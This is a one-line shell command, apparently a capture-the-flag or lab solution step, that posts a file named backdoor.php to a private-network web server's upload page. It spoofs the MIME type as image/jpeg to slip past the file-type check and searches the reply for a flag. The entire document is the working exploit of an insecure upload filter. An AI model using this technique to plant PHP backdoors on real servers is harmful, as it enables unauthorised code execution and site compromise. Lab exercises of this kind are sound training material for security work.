curl -X POST 'http://192.168.56.101/?page=upload' -F 'Uploaded=@backdoor.php;type=image/jpeg' -F 'Upload=Upload' | grep flag
